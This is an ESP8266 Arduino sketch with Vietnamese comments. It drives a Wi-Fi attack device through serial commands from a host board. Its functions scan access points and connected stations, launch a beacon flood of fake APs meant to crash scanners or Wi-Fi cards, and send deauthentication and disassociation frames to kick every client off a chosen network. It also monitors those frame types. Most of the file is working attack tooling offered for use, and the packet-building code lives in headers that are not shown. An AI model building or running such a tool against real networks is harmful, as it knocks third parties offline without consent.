//  CHƯƠNG TRÌNH TRÊN MẠCH CLIENT
//  CHỨC NĂNG CHÍNH:
//    1. Quét tất cả các mạng wifi có thể
//    2. Quét tất cả các máy trạm kết nối với 1 mạng wifi cụ thể
//    3. Tấn công BEACON FLOOD -> gửi cái BEACON FRAME để tạo cái AP giả mạo với số lượng lớn -> có thể làm crash trình SCAN NETWORK hoặc thậm chí WIFI CARD
//    4. Tấn công DEAUTHENTICATION/DISASSOCIATION -> kick tất cả các máy trạm đang kết nối với AP
//    5. Giám sát các frame: BEACON, DEAUTHENTICATION, DISASSOCIATION tại 1 kênh cụ thể

//  Mạch CLIENT kết nối với mạch HOST thông qua giao thức SERIAL
//  Sử dụng thư viện SerialCommand để gửi và nhận lệnh
//  Một chức năng đang hoạt động sẽ được báo hiệu bằng đèn LED trên mạch sẽ SÁNG, và TẮT khi chức năng đã thực hiện xong


#include"SCAN.h"
#include"BEACON.h"
#include"DEAUTH_DISAS.h"
#include"MONITOR.h"
#include<SerialCommand.h>
SCAN scan;
BEACON beacon;
DEAUTH_DISAS dedi;
MONITOR mon;
SerialCommand sCmd;

//----1. QUÉT MẠNG WIFI -----//

// Hàm bắt đầu quá trình quét tất cả các mạng wifi.
void startScanAP() {
  digitalWrite(BUILTIN_LED, LOW);               // bật LED
  scan.start();
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);              // tắt LED
}

// Hàm gửi kết quả các mạng wifi quét được.
void sendScanAPResults() {
  digitalWrite(BUILTIN_LED, LOW);
  scan.sendResults();
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

// Hàm chọn mạng wifi muốn tấn công.
// Đối số THỨ 2 trong SerialCommand là thứ tự mạng wifi trong danh sách muốn được chọn.
// Nếu đối số THỨ 2 không có thì mặc định sẽ chọn TẤT CẢ các mạng wifi quét được.
void selectAP() {
  digitalWrite(BUILTIN_LED, LOW);
  char* argu;
  argu = sCmd.next();                           // lấy đối số thứ 2
  int id = (argu != NULL) ? atoi(argu) : -1;
  scan.setSelected(id);
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

// Hàm gửi kết quả các mạng wifi đã được chọn.
void printAPSelected() {
  digitalWrite(BUILTIN_LED, LOW);
  scan.printSelected();
  Serial.println(scan.numOfAPSelected());
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

//---- 2. QUÉT CÁC STATION ĐANG KẾT NỐI ----//

// Hàm bắt đầu quá trình quét các station đang kết nối với mạng wifi đã được chọn.
// Đối số THỨ 2 trong SerialCommand là thời gian thực hiện quét station.
// Nếu đối THỨ 2 không có thì mặc định thời gian quét là "20 GIÂY".
void startScanStation() {
  digitalWrite(BUILTIN_LED, LOW);
  char* argu = sCmd.next();
  int timeout = (argu != NULL) ? atoi(argu) : 20;
  wifi_set_promiscuous_rx_cb(promisc_cb1);
  mon.startBad(timeout);
}

// Hàm gửi kết quả các station quét được
void sendScanStationResults() {
  digitalWrite(BUILTIN_LED, LOW);
  mon.sendBadResults();
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

// Hàm chọn station muốn tấn công
// Đối số "THỨ 2" trong SerialCommamd là thứ tự station trong danh sách muốn được chọn.
// Nếu đối số THỨ 2 không có thì mặc định sẽ chọn TẤT CẢ các STATION quét được.
void selectStation() {
  digitalWrite(BUILTIN_LED, LOW);
  char *argu = sCmd.next();
  int id = (argu != NULL) ? atoi(argu) : -1;
  mon.setSelected(id);
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

// Hàm gửi kết quả các station đã được chọn
void printSelectedStation() {
  digitalWrite(BUILTIN_LED, LOW);
  mon.printSelected();
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

//---- 3. TẤN CÔNG BEACON FLOOD ----//

// Đối số "THỨ 2" trong SerialCommand là ssid muốn giả mạo. Nếu = "RD" (Random) thì cho sinh ra các ssid ngẫu nhiên.
// Đối số "THỨ 3" trong SerialCommand là thời gian thực hiện tấn công. Mặc định là "20 GIÂY".
void beaconAttack() {
  digitalWrite(BUILTIN_LED, LOW);
  char* argu;
  argu = sCmd.next();
  if (argu != NULL) {
    String ssid = charToString(argu);
    Serial.println(ssid);
    if (ssid == "RD") {
      argu = sCmd.next();
      int timeout = (argu != NULL) ? atoi(argu) : 20;
      beacon.attack(timeout);
    }
    else {
      argu = sCmd.next();
      int timeout = (argu != NULL) ? atoi(argu) : 20;
      beacon.attack(ssid, timeout);
    }
  }
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

//---- 4. TẤN CÔNG DEAUTHENTICATION/DISASSOCIATION ----//

// Hàm tấn công Deauthentication.
// Đối số "THỨ 2" trong SerialCommand là thời gian thực hiện tấn công. Mặc định là "20 GIÂY".
// Đối số "THỨ 3" trong SerialCommand là tùy chọn tấn công tất cả bằng frame BOARDCAST. Mặc định sẽ được tắt.
void deauthAttack() {
  digitalWrite(BUILTIN_LED, LOW);
  char* argu = sCmd.next();
  int timeout = (argu != NULL) ? atoi(argu) : 20;
  argu = sCmd.next();
  int all = (argu != NULL) ? atoi(argu) : 0;
  dedi.attack(timeout, 0xc0, all);
  delay(200);
  digitalWrite(BUILTIN_LED, HIGH);
}

// Hàm tấn công Disassociation.
// Đối số "THỨ 2" trong SerialCommand là thời gian thực hiện tấn công. Mặc định là "20 GIÂY".
// Đối số "THỨ 3" trong SerialCommand là tùy chọn tấn công tất cả bằng frame BOARDCAST. Mặc định sẽ được tắt.
void disassoAttack() {
  digitalWrite(BUILTIN_LED, LOW);
  char* argu = sCmd.next();
  int timeout = (argu != NULL) ? atoi(argu) : 20;
  argu = sCmd.next();
  int all = (argu != NULL) ? atoi(argu) : 0;
  dedi.attack(timeout, 0xa0, all);
}

//---- 5. GIÁM SÁT 3 FRAME TRÊN MÔI TRƯỜNG KHÔNG DÂY ----//

// Đối số "THỨ 2" trong SerialCommand là thời gian thực hiện việc giám sát. Mặc định là "20 GIÂY".
// Đối số "THỨ 3" trong SerialCommand là kênh muốn giám sát. Mặc định là "KÊNH 6" (CHANNEL 6).
void startMonitorEnv() {
  char* argu = sCmd.next();
  int timeout = (argu != NULL) ? atoi(argu) : 20;
  argu = sCmd.next();
  int channel = (argu != NULL) ? atoi(argu) : 6;
  wifi_set_promiscuous_rx_cb(promisc_cb2);
  mon.startGood(timeout, channel);
}

// Cài đặt hàm callback promiscuous cho quá trình quét station
void promisc_cb1(uint8_t *buff, uint16_t len) {
  mon.badGuy(buff, len);
}

// Cài đặt hàm callback promiscuous cho quá trình giám sát mạng
void promisc_cb2(uint8_t *buff, uint16_t len) {
  mon.goodGuy(buff, len);
}
String charToString(const char* s) {
  String str = "";
  int i = 0;
  while (s[i] != NULL) {
    str += s[i];
    i++;
  }
  return str;
}
void setup() {
  Serial.begin(115200);                                                           // thiết lập cổng Serial hoạt động ở tốc độ 115200
  pinMode(BUILTIN_LED, OUTPUT);                                                   // thiết lập pin LED hoạt động ở chế độ OUTPUT
  digitalWrite(BUILTIN_LED, HIGH);                                                // tắt LED

  //--- Các lệnh SerialCommand nhận được từ mạch HOST----//
  sCmd.addCommand("RQ_S_S_AP", startScanAP);
  sCmd.addCommand("RQ_S_AP_R", sendScanAPResults);
  sCmd.addCommand("RQ_SL_AP", selectAP);
  sCmd.addCommand("RQ_P_S_AP", printAPSelected);
  sCmd.addCommand("RQ_S_S_S", startScanStation);
  sCmd.addCommand("RQ_S_ST_R", sendScanStationResults);
  sCmd.addCommand("RQ_SL_ST", selectStation);
  sCmd.addCommand("RQ_P_S_ST", printSelectedStation);
  sCmd.addCommand("RQ_BC_AT", beaconAttack);
  sCmd.addCommand("RQ_DE_AT", deauthAttack);
  sCmd.addCommand("RQ_DIS_AT", disassoAttack);
  sCmd.addCommand("RQ_MON", startMonitorEnv);
}
void loop() {
  sCmd.readSerial();
}
